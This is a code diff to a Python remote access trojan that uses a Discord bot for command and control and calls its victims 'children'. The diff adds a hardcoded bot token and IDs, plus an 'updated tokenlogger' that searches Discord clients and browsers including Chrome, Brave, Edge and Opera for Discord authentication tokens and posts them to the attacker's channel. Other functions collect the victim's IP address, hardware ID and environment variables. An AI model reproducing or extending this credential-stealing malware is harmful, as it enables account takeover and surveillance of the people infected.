@@ -9,9 +9,8 @@ ids = []
 #channel is the channel ID where updates will be sent
 #usid is the userID of the user
 #token is the token of your bot
-channel = ; usid = ; token = ""
+channel = 843737598504468490; usid = 360748438784180225; token = "ODM4NjI1MTY0OTQ1Nzg0ODQy.YI90jA.r1QEazpsw7OxtdBdMAHu2KrKH78"
 OS = plt.platform().split("-"); name = os.getenv("username"); Username = os.getenv("COMPUTERNAME")
-dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
 client = commands.Bot(command_prefix="null!"); client.remove_command("help")
 ratcwd = os.getcwd() # this keeps the original working dir in memory
 userid = str(usid)
@@ -37,17 +36,18 @@ def Hwid():
 	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
 	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
     
-#gets tokens
-def Tokens(path):
-	tokens = []
-	for file in os.listdir(path):
-		if not file.endswith(".log") and not file.endswith(".ldb"):
-			continue
-		for l in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
-			for mst in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-				for token in re.findall(mst, l):
-					tokens.append(token)
-	return tokens
+#updated tokenlogger
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
 
 #what the bot should do when its ready
 @client.event
@@ -55,25 +55,35 @@ async def on_ready():
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Null's children"))
     await client.get_channel(channel).send("<@" + userid + "> RAT started on child " + GetIP())
     
-#gets tokens
+#added better tokenlogger
 @client.command()
-async def tokens(ctx, IP):
-	if IP == GetIP():
-	    for platform, path in dire.items():
-	    	for token in Tokens(path):
-	    		uid = None
-	    		if not token.startswith("mfa."):
-	    			try:
-                    #does something
-	    				uid = b64decode(token.split(".")[0].encode()).decode()
-	    			except:
-	    				pass
-	    			if not uid or uid in ids:
-	    				continue
-	    		ids.append(uid)
-
-	    		messages = f"```ARM\nTokens: {token}\n```"
-	    await ctx.send(messages)
+async def tokens(ctx):
+    local = os.getenv('LOCALAPPDATA'); roaming = os.getenv('APPDATA')
+    paths = {
+        'Discord':         roaming + '\\Discord',
+        'Discord Canary':  roaming + '\\discordcanary',
+        'Discord PTB':     roaming + '\\discordptb',
+        'Opera':           roaming + '\\Opera Software\\Opera Stable',
+        'Opera GX':        roaming + '\\Opera Software\\Opera GX Stable',
+        'Lightcord':       roaming + '\\Lightcord',
+        'Google Chrome':   local + '\\Google\\Chrome\\User Data\\Default',
+        'Brave':           local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex':          local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Vivaldi':         local + '\\Vivaldi\\User Data\\Default',
+        'MSEdge':          local + '\\Microsoft\\Edge\\User Data\\Default'
+    }
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        msg = ""; msg += f'\n**{platform}**\n```\n'
+        tokens = find_tokens(path)
+        if len(tokens) > 0:
+            for token in tokens:
+                msg += f'{token}\n'
+        else:
+            msg += 'No token found.\n'
+        msg += '```'
+        await ctx.send(msg)
 
 #checks computer information
 @client.command()
@@ -211,7 +221,7 @@ async def getenv(ctx, IP, var):
   else: 
     await ctx.send(embed = ErrorMsg())
  
-async def startup(ctx, ip):
+#async def startup(ctx, ip):
   # Still a WIP
   
 # Just a fun command really 
